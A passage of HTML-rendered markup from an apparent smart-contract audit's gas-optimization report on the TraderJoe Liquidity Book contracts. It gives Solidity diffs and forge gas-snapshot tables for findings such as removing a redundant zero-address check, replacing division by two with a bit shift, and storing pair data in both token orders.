class=\"grvsc-source\"><span class=\"mtk8\">-            return mostSignificantBit(_integer);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        } else return leastSignificantBit(_integer);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return _isMostSignificant ? mostSignificantBit(_integer) : leastSignificantBit(_integer);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @notice Returns the index of the closest bit on the right of x that is non null</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -41,10 +37,8 @@ library BitMath {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint256 _shift = 255 - bit;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             x &lt;&lt;= _shift;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            if (x == 0) return type(uint256).max;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            // can&#39;t overflow as it&#39;s non-zero and we shifted it by `_shift`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            return mostSignificantBit(x) - _shift;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // can&#39;t underflow as it&#39;s non-zero and we shifted it by `_shift`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            return (x == 0) ? type(uint256).max : mostSignificantBit(x) - _shift;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -57,9 +51,7 @@ library BitMath {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         unchecked {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             x &gt;&gt;= bit;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            if (x == 0) return type(uint256).max;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            return leastSignificantBit(x) + bit;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            return (x == 0) ? type(uint256).max : leastSignificantBit(x) + bit;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p>Note that this optimization seems to be dependent on usage of a more recent Solidity version. The following gas savings are on version <code>0.8.17</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"csv\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Test Function,Gas Cost Difference,Percent Difference</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Overall,-13065,-0.200%</span></span></code></pre>\n<h2 id=\"g-04-checking-msgsender-to-not-be-zero-address-is-redundant\" style=\"position:relative;\"><a href=\"#g-04-checking-msgsender-to-not-be-zero-address-is-redundant\" aria-label=\"g 04 checking msgsender to not be zero address is redundant permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Checking <code>msg.sender</code> to not be zero address is redundant</h2>\n<p>There is an instance where <code>msg.sender</code> is checked not to be zero address. This check is redundant as no private key is known for this address, hence there can be no transactions coming from the zero address. The following diff removes this redundant check.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/libraries/PendingOwnable.sol b/src/libraries/PendingOwnable.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index f745362..97fb524 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/libraries/PendingOwnable.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/libraries/PendingOwnable.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -33,7 +33,7 @@ contract PendingOwnable is IPendingOwnable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @notice Throws if called by any account other than the pending owner.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     modifier onlyPendingOwner() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (msg.sender != _pendingOwner || msg.sender == address(0)) revert PendingOwnable__NotPendingOwner();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (msg.sender != _pendingOwner) revert PendingOwnable__NotPendingOwner();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p>This will save tiny amounts of gas when <code>PendingOwnable.becomeOwner()</code> is called.</p>\n<h2 id=\"g-05-an-element-is-cached-to-memory-after-it-is-used\" style=\"position:relative;\"><a href=\"#g-05-an-element-is-cached-to-memory-after-it-is-used\" aria-label=\"g 05 an element is cached to memory after it is used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] An element is cached to memory after it is used</h2>\n<p>Caching a struct element locally should be done before using it to save gas. The following diff applies this optimization.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/LBPair.sol b/src/LBPair.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 717270e..1d29c39 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/LBPair.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/LBPair.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -316,8 +316,8 @@ contract LBPair is LBToken, ReentrancyGuardUpgradeable, ILBPair {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (_amountIn == 0) revert LBPair__InsufficientAmounts();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         FeeHelper.FeeParameters memory _fp = _feeParameters;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        _fp.updateVariableFeeParameters(_pair.activeId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 _startId = _pair.activeId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _fp.updateVariableFeeParameters(_startId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 _amountOut;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Performs the actual swap, bin per bin</span></span></span></code></pre>\n<p>This will save small amount of gas when swapping.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"csv\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Test Function,Gas Cost Difference,Percent Difference</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSwapExactTokensForTokensSinglePair(),-30,-0.009%</span></span></code></pre>\n<h2 id=\"g-06-divisions-by-2n-can-be-replaced-by-right-shift-by-n\" style=\"position:relative;\"><a href=\"#g-06-divisions-by-2n-can-be-replaced-by-right-shift-by-n\" aria-label=\"g 06 divisions by 2n can be replaced by right shift by n permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] Divisions by <code>2**n</code> can be replaced by right shift by <code>n</code></h2>\n<p>There is an instance of division by <code>2</code>, which can be replaced by right shift by <code>1</code>. This simple bit operation is always cheaper than division. The following diff applies this optimization.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/libraries/Oracle.sol b/src/libraries/Oracle.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 974bc9f..fd9ca64 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/libraries/Oracle.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/libraries/Oracle.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -159,7 +159,7 @@ library Oracle {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 _sampleTimestamp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         while (_high &gt;= _low) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             unchecked {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                _middle = (_low + _high) / 2;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                _middle = (_low + _high) &gt;&gt; 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     _id := addmod(_middle, _index, _activeSize)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 }</span></span></span></code></pre>\n<p>Gas savings are obtained by <code>forge snapshot --diff</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"csv\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Test Function,Gas Cost Difference,Percent Difference</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testOracleSampleFromWith2Samples(),-4,-0.001%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testOracleSampleFromWith100SamplesNotAllInitialized(),-452,-0.002%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testFuzzingAddLiquidity(uint256),30,0.003%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testOracleSampleFromWith100Samples(),-1320,-0.005%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Overall,-1746,-0.005%</span></span></code></pre>\n<h2 id=\"g-07-runtime-cost-can-be-optimized-in-detriment-of-the-deploy-cost\" style=\"position:relative;\"><a href=\"#g-07-runtime-cost-can-be-optimized-in-detriment-of-the-deploy-cost\" aria-label=\"g 07 runtime cost can be optimized in detriment of the deploy cost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] Runtime cost can be optimized in detriment of the deploy cost</h2>\n<p>There are two optimization to improve runtime cost. Although the following optimizations will increase the gas cost of new pair creation and certain admin functions, it will decrease runtime cost of core protocol functions (swap, add/remove liquidity). Given that a pair is created once, but thousands of operations are made on it, optimizing for runtime can save a lot of gas in the long term.</p>\n<h3 id=\"g-07a-storing-lbfactory_lbpairsinfo-info-in-both-sorting-order-will-save-gas-in-runtime\" style=\"position:relative;\"><a href=\"#g-07a-storing-lbfactory_lbpairsinfo-info-in-both-sorting-order-will-save-gas-in-runtime\" aria-label=\"g 07a storing lbfactory_lbpairsinfo info in both sorting order will save gas in runtime permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07A] Storing <code>LBFactory._LBPairsInfo</code> info in both sorting order will save gas in runtime</h3>\n<p>When <code>LBFactory.createLBPair()</code> is called, the pair information can be stored in both sorting orders of its reserve tokens. This will allow skipping <a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L607-L611\"><code>_sortTokens()</code></a>, reducing the gas cost of <a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L593-L600\"><code>_getLBPairInformation()</code></a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/LBFactory.sol b/src/LBFactory.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 32ee39c..7c66fbf 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/LBFactory.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/LBFactory.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -183,9 +183,7 @@ contract LBFactory is PendingOwnable, ILBFactory {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         returns (LBPairInformation[] memory LBPairsAvailable)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         unchecked {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            (IERC20 _tokenA, IERC20 _tokenB) = _sortTokens(_tokenX, _tokenY);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            bytes32 _avLBPairBinSteps = _availableLBPairBinSteps[_tokenA][_tokenB];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            bytes32 _avLBPairBinSteps = _availableLBPairBinSteps[_tokenX][_tokenY];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint256 _nbAvailable = _avLBPairBinSteps.decode(type(uint8).max, 248);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (_nbAvailable &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -194,7 +192,7 @@ contract LBFactory is PendingOwnable, ILBFactory {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 uint256 _index;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 for (uint256 i = MIN_BIN_STEP; i &lt;= MAX_BIN_STEP; ++i) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     if (_avLBPairBinSteps.decode(1, i) == 1) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenA][_tokenB][i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenX][_tokenY][i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                         LBPairsAvailable[_index] = LBPairInformation({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                             binStep: i.safe24(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -273,6 +271,12 @@ contract LBFactory is PendingOwnable, ILBFactory {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             createdByOwner: msg.sender == _owner,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             ignoredForRouting: false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _LBPairsInfo[_tokenB][_tokenA][_binStep] = LBPairInformation({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            binStep: _binStep,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            LBPair: _LBPair,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            createdByOwner: msg.sender == _owner,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            ignoredForRouting: false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         allLBPairs.push(_LBPair);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -286,6 +290,7 @@ contract LBFactory is PendingOwnable, ILBFactory {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Save the changes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             _availableLBPairBinSteps[_tokenA][_tokenB] = _avLBPairBinSteps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            _availableLBPairBinSteps[_tokenB][_tokenA] = _avLBPairBinSteps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit LBPairCreated(_tokenX, _tokenY, _binStep, _LBPair, allLBPairs.length - 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -315,14 +320,13 @@ contract LBFactory is PendingOwnable, ILBFactory {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 _binStep,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         bool _ignored</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external override onlyOwner {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        (IERC20 _tokenA, IERC20 _tokenB) = _sortTokens(_tokenX, _tokenY);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenA][_tokenB][_binStep];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenX][_tokenY][_binStep];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (address(_LBPairInformation.LBPair) == address(0)) revert LBFactory__AddressZero();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (_LBPairInformation.ignoredForRouting == _ignored) revert LBFactory__LBPairIgnoredIsAlreadyInTheSameState();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        _LBPairsInfo[_tokenA][_tokenB][_binStep].ignoredForRouting = _ignored;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _LBPairsInfo[_tokenX][_tokenY][_binStep].ignoredForRouting = _ignored;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _LBPairsInfo[_tokenY][_tokenX][_binStep].ignoredForRouting = _ignored;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit LBPairIgnoredStateChanged(_LBPairInformation.LBPair, _ignored);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -595,7 +599,6 @@ contract LBFactory is PendingOwnable, ILBFactory {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         IERC20 _tokenB,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 _binStep</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) private view returns (LBPairInformation memory) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        (_tokenA, _tokenB) = _sortTokens(_tokenA, _tokenB);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         return _LBPairsInfo[_tokenA][_tokenB][_binStep];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span></code></pre>\n<h3 id=\"g-07b-using-create2-is-cheaper-than-clones\" style=\"position:relative;\"><a href=\"#g-07b-using-create2-is-cheaper-than-clones\" aria-label=\"g 07b using create2 is cheaper than clones permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07B] Using CREATE2 is cheaper than Clones</h3>\n<p>Using clone contracts requires extra proxy call, increasing the cost of all pair functions. Using CREATE2, although will increase cost of pair creation, will make all pair interactions cheaper.</p>\n<h2 id=\"g-08-making-constant-variables-private-will-save-gas-during-deployment\" style=\"position:relative;\"><a href=\"#g-08-making-constant-variables-private-will-save-gas-during-deployment\" aria-label=\"g 08 making constant variables private will save gas during deployment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 